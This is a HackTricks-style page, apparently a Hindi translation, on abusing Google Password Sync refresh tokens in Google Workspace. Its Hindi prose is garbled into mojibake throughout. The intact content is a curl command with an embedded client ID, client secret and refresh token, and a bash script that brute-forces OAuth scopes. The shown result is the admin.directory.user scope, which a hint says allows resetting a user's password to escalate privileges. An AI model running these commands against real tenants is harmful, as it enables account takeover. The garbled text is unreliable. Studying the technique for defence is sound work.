### GPS - ‡§∞‡§ø‡§´‡•ç‡§∞‡•á‡§∂ ‡§ü‡•ã‡§ï‡§® ‡§∏‡•á ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ü‡•ã‡§ï‡§® ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡§∞‡§®‡§æ

‡§∞‡§ø‡§´‡•ç‡§∞‡•á‡§∂ ‡§ü‡•ã‡§ï‡§® ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á, ‡§á‡§∏‡•á ‡§î‡§∞ ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§Æ‡•á‡§Ç ‡§®‡§ø‡§∞‡•ç‡§¶‡§ø‡§∑‡•ç‡§ü ‡§ï‡•ç‡§≤‡§æ‡§á‡§Ç‡§ü ‡§Ü‡§à‡§°‡•Ä ‡§î‡§∞ ‡§ï‡•ç‡§≤‡§æ‡§á‡§Ç‡§ü ‡§∏‡•Ä‡§ï‡•ç‡§∞‡•á‡§ü ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ü‡•ã‡§ï‡§® ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à:
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - Scopes

{% hint style="info" %}
‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§∞‡§ø‡§´‡•ç‡§∞‡•á‡§∂ ‡§ü‡•ã‡§ï‡§® ‡§π‡•ã‡§®‡•á ‡§ï‡•á ‡§¨‡§æ‡§µ‡§ú‡•Ç‡§¶, ‡§Ü‡§™ ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ü‡•ã‡§ï‡§® ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§∏‡•ç‡§ï‡•ã‡§™ ‡§ï‡§æ ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§Ü‡§™ ‡§ï‡•á‡§µ‡§≤ ‡§â‡§® **‡§∏‡•ç‡§ï‡•ã‡§™ ‡§ï‡§æ ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡•ã ‡§â‡§∏ ‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§ø‡§§ ‡§π‡•à‡§Ç ‡§ú‡§π‡§æ‡§Ç ‡§Ü‡§™ ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ü‡•ã‡§ï‡§® ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡§∞ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç**‡•§

‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§∞‡§ø‡§´‡•ç‡§∞‡•á‡§∂ ‡§ü‡•ã‡§ï‡§® ‡§π‡§∞ ‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® ‡§Æ‡•á‡§Ç ‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡•§
{% endhint %}

‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§∞‡•Ç‡§™ ‡§∏‡•á GPS ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§π‡§∞ ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ OAuth ‡§∏‡•ç‡§ï‡•ã‡§™ ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§ó‡•Ä, ‡§á‡§∏‡§≤‡§ø‡§è ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§π‡§Æ ‡§â‡§® ‡§∏‡•ç‡§ï‡•ã‡§™ ‡§ï‡•ã ‡§ñ‡•ã‡§ú ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡§ø‡§®‡•ç‡§π‡•á‡§Ç `refresh_token` ‡§ï‡•á ‡§∏‡§æ‡§• `access_token` ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à:

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

‡§î‡§∞ ‡§Ø‡§π ‡§µ‡§π ‡§Ü‡§â‡§ü‡§™‡•Å‡§ü ‡§π‡•à ‡§ú‡•ã ‡§Æ‡•Å‡§ù‡•á ‡§≤‡•á‡§ñ‡§® ‡§ï‡•á ‡§∏‡§Æ‡§Ø ‡§Æ‡§ø‡§≤‡§æ:
```
https://www.googleapis.com/auth/admin.directory.user
```
‡§ú‡•ã ‡§µ‡§π‡•Ä ‡§π‡•à ‡§ú‡•ã ‡§Ü‡§™‡§ï‡•ã ‡§Æ‡§ø‡§≤‡§§‡§æ ‡§π‡•à ‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§ï‡•ã‡§à ‡§¶‡§æ‡§Ø‡§∞‡§æ ‡§®‡§ø‡§∞‡•ç‡§¶‡§ø‡§∑‡•ç‡§ü ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç‡•§

{% hint style="danger" %}
‡§á‡§∏ ‡§¶‡§æ‡§Ø‡§∞‡•á ‡§ï‡•á ‡§∏‡§æ‡§• ‡§Ü‡§™ **‡§è‡§ï ‡§Æ‡•å‡§ú‡•Ç‡§¶‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡§æ ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§§‡§æ‡§ï‡§ø ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§¨‡§¢‡§º ‡§∏‡§ï‡•á**‡•§
{% endhint %}

## ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠

* [https://www.youtube.com/watch?v=FEQxHRRP\_5I](https://www.youtube.com/watch?v=FEQxHRRP\_5I)
* [https://issues.chromium.org/issues/40063291](https://issues.chromium.org/issues/40063291)

{% hint style="success" %}
AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡•á‡§Ç</summary>

* [**‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Å**](https://github.com/sponsors/carlospolop) ‡§ú‡§æ‡§Ç‡§ö‡•á‡§Ç!
* **üí¨ [**Discord ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**telegram ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç ‡§Ø‡§æ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ‡§™‡§∞ ‡§π‡§Æ‡•á‡§Ç **‡§´‡•â‡§≤‡•ã** ‡§ï‡§∞‡•á‡§Ç‡•§**
* **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ‡§ó‡§ø‡§ü‡§π‡§¨ ‡§∞‡§ø‡§™‡•ã‡§ú‡§ø‡§ü‡§∞‡•Ä ‡§Æ‡•á‡§Ç PR ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡•á‡§Ç‡•§**

</details>
{% endhint %}
